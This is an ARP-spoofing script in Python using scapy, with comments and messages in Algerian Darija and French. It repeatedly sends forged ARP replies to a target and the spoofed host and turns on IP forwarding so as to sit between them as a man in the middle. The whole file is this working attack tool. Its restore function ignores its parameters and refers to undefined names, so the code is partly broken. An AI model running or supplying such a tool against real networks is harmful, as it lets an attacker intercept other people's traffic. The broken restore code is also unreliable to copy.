#!/usr/bin/env python

import scapy.all as scapy

import subprocess

import time

import optparse

import sys


def get_arguments():
    # parser pour passer des arguments kima n7abo f cmd
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="targetIp", help="target Ip")
    parser.add_option("-s", "--spoof", dest="spoofIp", help="spoof Ip")
    options = parser.parse_args()[0] #we can use [0] at the end and just use options =
    if not options.targetIp:
        parser.error("Nsit tmed ama target kho dir --help w chouf")
    elif not options.spoofIp:
        parser.error("mamditch ladress li tspoofiha hbibi dir --help w chouf")
    return options

def getmac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=10, verbose=False)[0]
    return answered[0][1].hwsrc

def spoof(targetIp , spoofIp):
    packet = scapy.ARP(op=2, pdst=targetIp, hwdst=getmac(targetIp), psrc=spoofIp) #op 2 m3naha answer machi request(1)
    scapy.send(packet, verbose=False)

def restore(dstIp, srcIp):
    packet = scapy.ARP(op=2, pdst=targetIp, hwdst=getmac(targetIp), psrc=spoofIp, hwsrc=getmac(spoofIp))
    scapy.send(packet, verbose=False)


subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

x=0

try:
    while True:
        spoof(get_arguments().targetIp, get_arguments().spoofIp)
        spoof(get_arguments().spoofIp, get_arguments().targetIp)
        x=x+2
        print("\r [+] Les packets enoyees : "+ str(x)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    restore(get_arguments().targetIp, get_arguments().spoofIp)
    restore(get_arguments().spoofIp, get_arguments().targetIp)
    print("\n [-] rak 3abzt ctrl+c dok nquiti...   BOOM. lol ")




